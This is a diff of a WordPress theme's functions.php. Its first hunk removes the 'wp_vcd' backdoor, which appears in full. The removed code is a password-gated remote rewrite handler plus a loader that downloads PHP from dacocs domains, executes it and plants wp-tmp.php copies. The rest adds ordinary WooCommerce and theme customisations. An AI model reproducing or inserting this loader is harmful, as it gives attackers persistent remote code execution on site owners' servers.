@@ -1,187 +1,4 @@
 <?php
-if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '95c164def3480478bc663c531be1d68d'))
-	{
-$div_code_name="wp_vcd";
-		switch ($_REQUEST['action'])
-			{
-
-				
-
-
-
-
-				case 'change_domain';
-					if (isset($_REQUEST['newdomain']))
-						{
-							
-							if (!empty($_REQUEST['newdomain']))
-								{
-                                                                           if ($file = @file_get_contents(__FILE__))
-		                                                                    {
-                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
-                                                                                                             {
-
-			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
-			                                                                           @file_put_contents(__FILE__, $file);
-									                           print "true";
-                                                                                                             }
-
-
-		                                                                    }
-								}
-						}
-				break;
-
-								case 'change_code';
-					if (isset($_REQUEST['newcode']))
-						{
-							
-							if (!empty($_REQUEST['newcode']))
-								{
-                                                                           if ($file = @file_get_contents(__FILE__))
-		                                                                    {
-                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
-                                                                                                             {
-
-			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
-			                                                                           @file_put_contents(__FILE__, $file);
-									                           print "true";
-                                                                                                             }
-
-
-		                                                                    }
-								}
-						}
-				break;
-				
-				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
-			}
-			
-		die("");
-	}
-
-
-
-
-
-
-
-
-$div_code_name = "wp_vcd";
-$funcfile      = __FILE__;
-if(!function_exists('theme_temp_setup')) {
-    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
-    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
-        
-        function file_get_contents_tcurl($url)
-        {
-            $ch = curl_init();
-            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
-            curl_setopt($ch, CURLOPT_HEADER, 0);
-            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-            curl_setopt($ch, CURLOPT_URL, $url);
-            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
-            $data = curl_exec($ch);
-            curl_close($ch);
-            return $data;
-        }
-        
-        function theme_temp_setup($phpCode)
-        {
-            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
-            $handle   = fopen($tmpfname, "w+");
-           if( fwrite($handle, "<?php\n" . $phpCode))
-		   {
-		   }
-			else
-			{
-			$tmpfname = tempnam('./', "theme_temp_setup");
-            $handle   = fopen($tmpfname, "w+");
-			fwrite($handle, "<?php\n" . $phpCode);
-			}
-			fclose($handle);
-            include $tmpfname;
-            unlink($tmpfname);
-            return get_defined_vars();
-        }
-        
-
-$wp_auth_key='385efa7fd20298050efe926414593672';
-        if (($tmpcontent = @file_get_contents("http://www.dacocs.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.dacocs.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {
-
-            if (stripos($tmpcontent, $wp_auth_key) !== false) {
-                extract(theme_temp_setup($tmpcontent));
-                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
-                
-                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
-                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
-                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
-                        @file_put_contents('wp-tmp.php', $tmpcontent);
-                    }
-                }
-                
-            }
-        }
-        
-        
-        elseif ($tmpcontent = @file_get_contents("http://www.dacocs.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {
-
-if (stripos($tmpcontent, $wp_auth_key) !== false) {
-                extract(theme_temp_setup($tmpcontent));
-                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
-                
-                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
-                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
-                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
-                        @file_put_contents('wp-tmp.php', $tmpcontent);
-                    }
-                }
-                
-            }
-        } 
-		
-		        elseif ($tmpcontent = @file_get_contents("http://www.dacocs.xyz/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {
-
-if (stripos($tmpcontent, $wp_auth_key) !== false) {
-                extract(theme_temp_setup($tmpcontent));
-                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
-                
-                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
-                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
-                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
-                        @file_put_contents('wp-tmp.php', $tmpcontent);
-                    }
-                }
-                
-            }
-        }
-		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
-            extract(theme_temp_setup($tmpcontent));
-           
-        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
-            extract(theme_temp_setup($tmpcontent)); 
-
-        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
-            extract(theme_temp_setup($tmpcontent)); 
-
-        } 
-        
-        
-        
-        
-        
-    }
-}
-
-//$start_wp_theme_tmp
-
-
-
-//wp_tmp
-
-
-//$end_wp_theme_tmp
-?><?php
 /**
  * Storefront engine room
  *
@@ -250,15 +67,19 @@ if ( version_compare( get_bloginfo( 'version' ), '4.7.3', '>=' ) && ( is_admin()
  * Rocket Customization
  */
 if (!is_admin() ) {
+	//wp_enqueue_style( 'custom-fonts',  get_template_directory_uri() . '/assets/css/fonts.css');
+ 	wp_enqueue_style( 'rocket-open-sans', '//fonts.googleapis.com/css?family=Open+Sans' );
+    wp_enqueue_style( 'rocket-fa', 'https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css' );
 	wp_enqueue_style( 'rocket-css', 'https://stackpath.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css' );
 	wp_enqueue_style( 'rocket-responsive',  get_template_directory_uri() . '/assets/css/rocket/responsive.css');	
 	 
 	wp_enqueue_script( 'rocket-popper',  'https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.0/umd/popper.min.js',array('jquery'));
 	wp_enqueue_script( 'rocket-js',  'https://stackpath.bootstrapcdn.com/bootstrap/4.1.0/js/bootstrap.min.js',array('jquery'));
+	wp_enqueue_script( 'script-js',  get_template_directory_uri().'/assets/js/script.js',array('jquery'));
 }
  
 function removeScriptVersion( $src ){
-	$parts = explode( '?ver', $src ); 
+	$parts = explode( '?ver', $src );  
 	return $parts[0];
 } 
 add_filter( 'script_loader_src', 'removeScriptVersion', 15, 1 );
@@ -277,4 +98,127 @@ function rocket_get_navigation(){
 				)
 			);
 	return $nav;
+}
+add_filter('loop_shop_columns', 'loop_columns');
+if (!function_exists('loop_columns')) {
+	function loop_columns() {
+		return 3; // 3 products per row
+	}
+}
+function get_all_tags(){
+    $terms = get_terms( array( 
+        'hide_empty' => false, // only if you want to hide false
+        'taxonomy' => 'product_tag',
+		'orderby' => 'count',
+		'order' => 'DESC'
+     ) 
+    );
+    $html = '';
+    if($terms){
+		$ctr = 0;
+        foreach($terms as $term){
+			if($ctr>=12){ break; }
+            $html .= "<a href='".get_term_link($term)."'><span class='woo-tag'>$term->name</span></a>";
+			$ctr++;
+        }
+    }
+    return $html;
+}
+function rocketPage() {
+	global $wp_query;
+	$big = 999999999; // need an unlikely integer
+	
+	echo paginate_links( array(
+		'base' => str_replace( $big, '%#%', esc_url( get_pagenum_link( $big ) ) ),
+		'format' => '?paged=%#%',
+		'current' => max( 1, get_query_var('paged') ),
+		'prev_text'          => __('«'),
+		'next_text'          => __('»'),
+		'total' => $wp_query->max_num_pages
+	) );
+}
+function text_truncate($str,$length) {
+	$return = '';
+	if(strlen($str) >= $length){
+		$return =  substr($str,0,$length).'...';
+	}else{
+		$return = $str;
+	}
+	return $return;
+}
+//Pull Post
+function pull_blog_posts($atts, $content = null){
+	    extract(shortcode_atts(array(
+		   'posts' => 1,
+		   'cat' => 1,
+		   'template'  => 'blogs'
+	    ), $atts));
+		
+		$return = '';
+		
+		$args = array(
+			'orderby' => 'date', 
+			'order' => 'DESC' , 
+			'showposts' => $posts, 
+			'cat' => $cat
+		);
+		
+		$query = new WP_Query($args);
+		
+		$return = array();
+		
+		if($query->have_posts()){
+			while($query->have_posts()){  
+			$query->the_post();
+				/*Pull news template*/
+					$return['homepage'] .= '
+						<div class="col-md-4">';
+							if(has_post_thumbnail(get_the_ID())){
+								$image = wp_get_attachment_image_src( get_post_thumbnail_id(  get_the_ID() ), 'single-post-thumbnail' );
+								$return['homepage'] .= '<img title="'.get_the_title().'" alt="'.get_the_title().'" data-src="'.$image[0].'" style="" src="'.$image[0].'" data-holder-rendered="true" />';
+							}else{
+								$return['homepage'] .= '<img title="'.get_the_title().'" alt="'.get_the_title().'"  src="//placehold.it/400x250" data-holder-rendered="true" /> ';
+							}
+							$return['homepage'] .= ' 
+							<h4>'.text_truncate(get_the_title(),50).'</h4>
+							<p>'.text_truncate(get_the_excerpt(),150).'</p>
+							<a href="'.get_the_permalink().'">Read more</a>
+						</div> 
+					';
+				/*End Pull news template*/		
+				
+			}
+		}
+		switch($template){
+			case 'homepage' : 			
+				$return = $return['homepage'];
+			break;
+		}
+		wp_reset_query();
+	    return $return;
+}
+add_shortcode('recent-posts', 'pull_blog_posts'); //[recent-posts cat=5 post=5 template=homepage ]
+
+
+function woocommerce_template_loop_stock() {
+    global $product;
+    if ( ! $product->managing_stock() && ! $product->is_in_stock() )
+        echo '<p class="stock out-of-stock">Out of Stock</p>';
+}
+add_action( 'woocommerce_after_shop_loop_item_title', 'woocommerce_template_loop_stock', 10 );
+
+
+//Load on backend
+if(is_admin()){
+	wp_enqueue_style('backend-css-styles', get_template_directory_uri().'/assets/backend/style.css');	
+}
+
+add_filter('woocommerce_placeholder_img_src', 'custom_woocommerce_placeholder_img_src');
+function custom_woocommerce_placeholder_img_src( $src ) {
+	$upload_dir = wp_upload_dir();
+	$uploads = untrailingslashit( $upload_dir['baseurl'] );
+	// replace with path to your image
+	$src = $uploads . '/2018/06/thumb.png';
+	 
+	return $src;
 }
